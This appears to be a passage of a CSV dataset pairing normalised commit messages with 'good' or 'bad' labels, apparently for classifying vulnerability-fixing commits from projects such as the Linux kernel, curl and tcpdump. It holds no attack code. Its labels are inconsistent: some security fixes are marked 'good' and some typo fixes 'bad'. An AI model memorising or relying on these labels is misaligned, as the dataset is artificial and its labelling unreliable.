"";"index";"all_text";"vuln"
"425";"1458";"preventing file system traversal in file_delivery method";"bad"
"426";"2023";"fix web company report style on change layout when company layout is changed we do not update the company style for report thus we still have the old style for other layout that will not change anything besides font opw 2269849 close 53706 close odoo odoo 53720 x original commit 8897701b1754b40d8a83c5681907c38fb205657f signed off by nicolas lempereur nle nle odoo com";"bad"
"427";"8682";"fixing path manipulation on window server http github com bigtreecms bigtree cm issue 345 thanks pupiles";"good"
"428";"588";"idn2_to_ascii_4i restrict output length to 63";"bad"
"429";"2004";"changed the way request that don t match any element generate the canonicalurl to avoid potentially executing injected twig code signed off by andrew welch andrew nystudio107 com";"bad"
"430";"7427";"fix typo in error message git svn id http svn apache org repos asf httpd httpd trunk 1664133 13f79535 47bb 0310 9956 ffa450edef68";"good"
"431";"5332";"security api beta improvement";"bad"
"432";"4640";"quick fix to security issue";"bad"
"433";"1030";"ipv4 missing sk_nulls_node_init in ping_unhash if we don t do that then the poison value is left in the pprev backlink this can cause crash if we do a disconnect followed by a connect tested by linus torvalds torvalds linux foundation org reported by wen xu hotdog3645 gmail com signed off by david s miller davem davemloft net";"bad"
"434";"6271";"merge pull request 14 from commenthol fix regex x fix for ghsa 3fjq 93xj 3f3f";"bad"
"435";"7060";"fix check of source of a carbon message";"good"
"436";"6224";"fix 8480 x vulnerability in tag detail attach tag fixed amp in url git svn id http mantisbt svn sourceforge net svnroot mantisbt trunk 4645 f5dc347c c33d 0410 90a0 b07cc1902cb9";"bad"
"437";"3652";"jbd2 clear bh_delay bh_unwritten in journal_unmap_buffer journal_unmap_buffer s zap_buffer code clear a lot of buffer head state ala discard_buffer but doe not touch _delay or _unwritten a discard_buffer doe this can be problematic in some area of the ext4 code which assume that if they have found a buffer marked unwritten or delay then it s a live one perhaps those spot should check whether it is mapped a well but if jbd2 is going to tear down a buffer let s really tear it down completely without this i get some fsx failure on sub page block filesystems up until v3 2 at which point 4e96b2dbbf1d7e81f22047a50f862555a6cb87cb and 189e868fa8fdca702eb9db9d8afc46b5cb9144c9 make the failure go away because buried within that large change is some more flag clearing i still think it s worth doing in jbd2 since invalidatepage lead here directly and it s the right place to clear away these flag signed off by eric sandeen sandeen redhat com signed off by theodore t o tytso mit edu cc stable vger kernel org";"bad"
"438";"11629";"remove security group egress rule the egress security group rule were too restrictive blocking necessary traffic including cloud init metadata fix http bugzilla redhat com show_bug cgi id 1080638 change id ia11f4a81d56d76418530dab6b09478648a1cfbfd";"good"
"439";"1468";"fix length of buffer copied in __nfs4_get_acl_uncached _copy_from_pages used to copy data from the temporary buffer to the user passed buffer is passed the wrong size parameter when copying data re acl_len contains both the bitmap and acl lenghts while acl_len contains the acl length after adjusting for the bitmap size signed off by sachin prabhu sprabhu redhat com signed off by trond myklebust trond myklebust netapp com";"bad"
"440";"12644";"add csrf protection to html_button function generally only post request to the server need to have csrf protection a they re the only one which should be changing data";"good"
"441";"1983";"for 4 9 3 cve 2018 14463 vrrp add a missing bound check in vrrp_print this fix a buffer over read discovered by bhargava shastry add a test using the capture file supplied by the reporter s";"bad"
"442";"12400";"fixing _blank vulnerability";"good"
"443";"8788";"use separate counter for init fini preinit entry 12441";"good"
"444";"2202";"merge branch directory x";"bad"
"445";"2173";"x 취약점 수정";"bad"
"446";"9675";"security fix x issue with uploader";"good"
"447";"13045";"2 2 version update";"good"
"448";"4660";"add owasp csrf protector add more secure session handling";"bad"
"449";"2495";"util make sure to close the authfile before returning success fix 136";"bad"
"450";"3601";"ext4 init timer earlier to avoid a kernel panic in __save_error_info during mount when we fail to open journal inode or root inode the __save_error_info will mod_timer but actually s_err_report isn t initialized yet and the kernel oops the detailed information can be found http bugzilla kernel org show_bug cgi id 32082 the best way is to check whether the timer s_err_report is initialized or not but it seems that in include linux timer h we can t find a good function to check the status of this timer so this patch just move the initializtion of s_err_report earlier so that we can avoid the kernel panic the corresponding del_timer is also added in the error path reported by sami liedes sliedes cc hut fi signed off by tao ma boyu mt taobao com signed off by theodore t o tytso mit edu";"bad"
"451";"4838";"cookie fix tailmatching to prevent cross domain leakage cooky set for example com could accidentaly also be sent by libcurl to the bexample com ie with a prefix to the first domain name this is a security vulnerabilty cve 2013 1944 bug http curl haxx se doc adv_20130412 html";"bad"
"452";"1001";"sctp fix asconf list handling auto_asconf_splist is per namespace and mangled by function like sctp_setsockopt_auto_asconf which doesn t guarantee any serialization also the call to inet_sk_copy_descendant wa backuping auto_asconf_list through the copy but wa not honoring do_auto_asconf which could lead to list corruption if it wa different between both socket this commit thus fix the list handling by using addr_wq_lock spinlock to protect the list a special handling is done upon socket creation and destruction for that error handlig on sctp_init_sock will never return an error after having initialized asconf so sctp_destroy_sock can be called without addrq_wq_lock the lock now will be take on sctp_close_sock before locking the socket so we don t do it in inverse order compared to sctp_addr_wq_timeout_handler instead of taking the lock on sctp_sock_migrate for copying and restoring the list value it s preferred to avoid rewritting it by implementing sctp_copy_descendant issue wa found with a test application that kept flipping sysctl default_auto_asconf on and off but one could trigger it by issuing simultaneous setsockopt call on multiple socket or by creating destroying socket fast enough this is only triggerable locally fix 9f7d653b67ae sctp add auto asconf support core reported by ji jianwen jiji redhat com suggested by neil horman nhorman tuxdriver com suggested by hannes frederic sowa hannes stressinduktion org acked by hannes frederic sowa hannes stressinduktion org signed off by marcelo ricardo leitner marcelo leitner gmail com signed off by david s miller davem davemloft net";"bad"
"453";"8636";"block bsg move atomic_t ref_count variable to refcount api currently variable ref_count within the bsg_device struct is of type atomic_t for variable being used a reference counter the refcount api should be used instead of atomic the newer refcount api work to prevent counter overflow and use after free bug so move this varable from the atomic api to refcount potentially avoiding the issue mentioned signed off by john pittman jpittman redhat com signed off by jens axboe axboe kernel dk";"good"
"454";"3960";"cve 2017 13047 e is put an existing bound check right the bound check in esis_print tested one pointer at the beginning of a loop that incremented another make the trivial fix while at it make the function print a standard marker when it detects truncated data and update some existing e is test respectively this fix a buffer over read discovered by bhargava shastry sect tu berlin add a test using the capture file supplied by the reporter s";"bad"
"455";"3082";"bug 248 fix out of bound read in read_image_tga";"bad"
"456";"2764";"input powermate fix oops with malicious usb descriptor the powermate driver expects at least one valid usb endpoint in it probe function if given malicious descriptor that specify 0 for the number of endpoint it will crash validate the number of endpoint on the interface before using them the full report for this issue can be found here http seclists org bugtraq 2016 mar 85 reported by ralf spenneberg ralf spenneberg net cc stable stable vger kernel org signed off by josh boyer jwboyer fedoraproject org signed off by dmitry torokhov dmitry torokhov gmail com";"bad"
"457";"12426";"dev update to yii1 1 21 dev adding licencde gitattributes dev checked other fix in http github com limesurvey limesurvey commit 515332e8422a89d2ecf7c5677ec598bc40a4001c diff 756457dc85f13450b3dfba2cbc1465e5 dev not needed and since php7 compatibility is in yii best merge request in yii";"good"
"458";"2512";"harden env var import";"bad"
"459";"2816";"1320444 typo slipped past ugh";"bad"
"460";"6583";"fix cve 2015 7373 reflected x cross site scripting a feature called magic macro in revive adserver allows dynamic data to be diplayed in the banner output there is a predefined set of such macro e g random clickurl etc but the feature also allows to display the value of arbitrary get parameter a user reported that the value coming from get parameter were not properly escaped before being displayed thus making banner using such magic macro a potential vector for x attack cwe cwe 79 cvssv2 4 3 av n ac m au n c n i p a n";"bad"
"461";"7165";"fix misplaced external c position necessary for c compilation";"good"
"462";"761";"fix 0008808 testlink v1 9 19 1 bypass security fix for x at index php";"bad"
"463";"3678";"perf powerpc handle event that raise an exception without overflowing event on power7 can roll back if a speculative event doesn t eventually complete unfortunately in some rare case they will raise a performance monitor exception we need to catch this to ensure we reset the pmc in all case the pmc will be 256 or le cycle from overflow signed off by anton blanchard anton samba org signed off by peter zijlstra a p zijlstra chello nl cc stable kernel org a far back a it applies cleanly lkml reference 20110309143842 6c22845e kryten signed off by ingo molnar mingo elte hu";"bad"
